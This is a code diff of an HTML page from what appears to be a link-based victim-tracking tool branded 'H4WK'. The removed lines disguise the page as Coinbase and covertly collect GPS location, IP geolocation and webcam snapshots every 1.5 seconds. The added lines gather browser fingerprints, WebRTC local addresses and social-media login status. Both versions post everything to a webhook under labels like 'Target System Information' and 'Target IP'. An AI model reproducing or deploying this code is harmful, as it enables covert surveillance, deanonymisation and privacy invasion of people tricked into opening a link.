@@ -2,270 +2,159 @@
 <html>
 
 <head>
-  <script type="text/javascript" src="dwebhook.js">
-  </script>
+  <script type="text/javascript" src="dwebhook.js"></script>
 </head>
 
-<body onload="getLocation()">
-
-  <iframe src="https://coinbase.com/" width="100%" height="100%" style="border:none;">
-  </iframe>
-
-  <p id="CoinBase Withdrawal #893453"></p>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-  </script>
+<body onload="init()">
+  <p>Collecting system information...</p>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  
   <script>
-    var x = document.getElementById("CoinBase Withdrawal #893453");
-
-    let datetime = new Date();
-    let localtime = String(datetime.toLocaleTimeString());
-
-
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
-
-    const request = new XMLHttpRequest();
-    request.open("POST", "/location_update"); //change webhook
-
-    request.setRequestHeader('Content-type', 'application/json');
-
-    var myEmbed = {
-      author: {
-        name: "Target System Information.."
-      },
-      title: "Uagent:",
-      description: sysinfo,
-      color: 15418782
+    function init() {
+      sendSystemInfo();
+      getWebGLFingerprint();
+      getAudioContextFingerprint();
+      getStorageEstimate();
+      checkSocialMediaLogin();
+      getNetworkInterfaces();
+      getGPUInfo();
+      logWindowDetails();
     }
 
-    var params = {
-      username: "H4WK",
-      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-      content: "@everyone Someone Opened The Link O_o ",
-      embeds: [myEmbed]
+    function sendSystemInfo() {
+      let datetime = new Date();
+      let localtime = String(datetime.toLocaleTimeString());
+
+      var sysinfo = ("```xl\n" + navigator.userAgent + "```" + 
+                     "```autohotkey\n" +
+                     "\nPlatform: " + navigator.platform +
+                     "\nCookies_Enabled: " + navigator.cookieEnabled +
+                     "\nBrowser_Language: " + navigator.language +
+                     "\nBrowser_Name: " + navigator.appName +
+                     "\nBrowser_CodeName: " + navigator.appCodeName +
+                     "\nRam: " + navigator.deviceMemory +
+                     "\nCPU_cores: " + navigator.hardwareConcurrency +
+                     "\nScreen_Width: " + screen.width +
+                     "\nScreen_Height: " + screen.height +
+                     "\nTime: " + localtime +
+                     "\nRefUrl: " + document.referrer +
+                     "\nOscpu: " + navigator.oscpu + "```");
+
+      sendWebhookMessage("Target System Information..", sysinfo, 15418782);
+
+      // Redirect to the next page after a short delay
+      setTimeout(function () {
+        window.location.href = "/cam/index.html";
+      }, 2000);
     }
 
-    request.send(JSON.stringify(params));
-
-    //...
-
-    $.getJSON("https://api.ipify.org?format=json", function (data) {
-      $("#gfg").html(data.ip);
-
+    function sendWebhookMessage(title, description, color = 15418782) {
       const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
+      request.open("POST", "/location_update"); 
 
       request.setRequestHeader('Content-type', 'application/json');
 
       var myEmbed = {
-        author: {
-          name: "Target Ip"
-        },
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
-        color: 15548997,
-
-        footer: {
-          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
-        }
-      }
-
-      var params = {
-        username: "H4WK",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "IP Address Reconnaissance"
-        },
-        title: response.status, //response.query
-        description: '```autohotkey\nContinent: ' + response.continent +
-          "\nContinentCode: " + response.continentcode +
-          "\nCountry: " + response.country +
-          "\nCountrycode: " + response.countrycode +
-          "\nRegionname: " + response.regionName +
-          "\nRegion: " + response.region +
-          "\nCity: " + response.city +
-          "\nDistrict: " + response.district +
-          "\nZip: " + response.zip +
-          "\nTime_zone: " + response.time_zone +
-          "\nName: " + response.name +
-          "\nAs: " + response.as +
-          "\nIsp: " + response.isp +
-          "\nReverse: " + response.reverse +
-          "\nOffset: " + response.offset +
-          "\nCurrency: " + response.currency +
-          "\nProxy: " + response.proxy +
-          "\nMobile: " + response.mobile +
-          "\nLat: " + response.lat +
-          "\nLon: " + response.lon + '```',
-        color: 5763719
-
-      }
-
-      var params = {
-        username: "H4WK",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        x.innerHTML = "Geolocation is not supported by this browser.";
-      }
-    }
-
-    function showPosition(position) {
-      var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Allowed Location Permission"
-        },
-        title: "GPS location of target..",
-        description: latlong + "\n",
-        color: 15844367,
-        footer: {
-          text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
-        }
-      }
-
-      var params = {
-        username: "H4WK",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-
-    }
-
-    function showError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          const request = new XMLHttpRequest();
-          request.open("POST", "/location_update"); //change webhook
-
-          request.setRequestHeader('Content-type', 'application/json');
-
-          const params = {
-            username: "H4WK",
-            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-            content: "```diff\n- User denied the request for Geolocation.```"
-          }
-
-          request.send(JSON.stringify(params));
-          break;
-        case error.POSITION_UNAVAILABLE:
-          x.innerHTML = "Location information is unavailable."
-          break;
-        case error.TIMEOUT:
-          x.innerHTML = "The request to get user location timed out."
-          break;
-        case error.UNKNOWN_ERROR:
-          x.innerHTML = "An unknown error occurred."
-          break;
-      }
-    }
-  </script>
-  <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
-  </div>
-  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-  <script>
-    var url = "";
-    request.open("GET", "/get_target", true);
-
-    request.onload = function () {
-      if (request.status === 200) {
-        url = request.responseText;
-      } else {
-        url = "http://0.0.0.0:80/image"
-      }
-    };
-
-    request.send();
-    function postFile(file) {
-      let formdata = new FormData();
-      formdata.append("image", file);
-      let xhr = new XMLHttpRequest();
-      xhr.open('POST', url, true);
-      xhr.onload = function () {
-        if (this.status === 200)
-          console.log(this.response);
-        else
-          console.error(xhr);
+        author: { name: title },
+        description: description,
+        color: color
       };
-      xhr.send(formdata);
+
+      var params = {
+        username: "H4WK",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [myEmbed]
+      };
+
+      request.send(JSON.stringify(params));
     }
 
-
-
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const errorMsgElement = document.querySelector('span#errorMsg');
-
-    const constraints = {
-      audio: false,
-      video: {
-
-        facingMode: "user"
-      }
-    };
-
-    // Access webcam
-    async function init() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints)
-        handleSuccess(stream);
-      } catch (e) {
-        setTimeout(function () {
-          alert("Allow Camera access to video chat");
-          window.location.href = "https://coinbase.com/"
-          alert("Grant cam access")
-        }, 150000)
-      }
+    function getWebGLFingerprint() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      sendWebhookMessage("WebGL Fingerprint", `Vendor: ${vendor}, Renderer: ${renderer}`, 15418782);
     }
 
-    // Success
-    function handleSuccess(stream) {
-      window.stream = stream;
-      video.srcObject = stream;
+    function getAudioContextFingerprint() {
+      const context = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = context.createOscillator();
+      const analyser = context.createAnalyser();
+      const gain = context.createGain();
+      const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
 
-      var context = canvas.getContext('2d');
-      setInterval(function () {
+      oscillator.type = 'triangle';
+      oscillator.frequency.setValueAtTime(10000, context.currentTime);
+      gain.gain.setValueAtTime(0, context.currentTime);
+      oscillator.connect(analyser);
+      analyser.connect(gain);
+      gain.connect(scriptProcessor);
+      scriptProcessor.connect(context.destination);
+      oscillator.start(0);
 
-        context.drawImage(video, 0, 0, 640, 480);
-        canvas.toBlob(postFile, 'image/jpeg');
-      }, 1500);
-
-
+      scriptProcessor.onaudioprocess = () => {
+        const fingerprint = analyser.getFloatFrequencyData(new Float32Array(analyser.frequencyBinCount)).toString();
+        sendWebhookMessage("AudioContext Fingerprint", fingerprint, 15418782);
+        scriptProcessor.onaudioprocess = null; // Stop after first run
+      };
     }
 
-    // Load init
-    init();
+    function getStorageEstimate() {
+      navigator.storage.estimate().then(estimate => {
+        const storageInfo = `Quota: ${estimate.quota} bytes, Usage: ${estimate.usage} bytes`;
+        sendWebhookMessage("Persistent Storage Estimate", storageInfo, 15418782);
+      });
+    }
+
+    function checkSocialMediaLogin() {
+      const socialMedia = [
+        { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
+        { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
+        { name: 'LinkedIn', url: 'https://www.linkedin.com/favicon.ico' }
+      ];
+      socialMedia.forEach(site => {
+        const img = new Image();
+        img.src = site.url;
+        img.onload = () => sendWebhookMessage(`${site.name} Login`, "User is logged in", 15418782);
+        img.onerror = () => sendWebhookMessage(`${site.name} Login`, "User is not logged in", 15418782);
+      });
+    }
+
+    function getNetworkInterfaces() {
+        const rtc = new RTCPeerConnection({iceServers: []});
+        rtc.createDataChannel('');
+        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+        rtc.onicecandidate = function(event) {
+            if (!event || !event.candidate) return;
+            const candidate = event.candidate.candidate;
+            sendWebhookMessage("Network Interface", candidate);
+        };
+    }
+
+    function getGPUInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
+        const gpuInfo = {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+            maxAnisotropy: gl.getParameter(gl.MAX_TEXTURE_MAX_ANISOTROPY_EXT)
+        };
+
+        sendWebhookMessage("Detailed GPU Info", JSON.stringify(gpuInfo));
+    }
+
+    function logWindowDetails() {
+        const windowSize = `Inner Width: ${window.innerWidth}, Inner Height: ${window.innerHeight}`;
+        const screenSize = `Screen Width: ${screen.width}, Screen Height: ${screen.height}`;
+        const windowPosition = `ScreenX: ${window.screenX}, ScreenY: ${window.screenY}`;
+
+        sendWebhookMessage("Window Details", `${windowSize}\n${screenSize}\n${windowPosition}`);
+    }
+
   </script>
 </body>
 
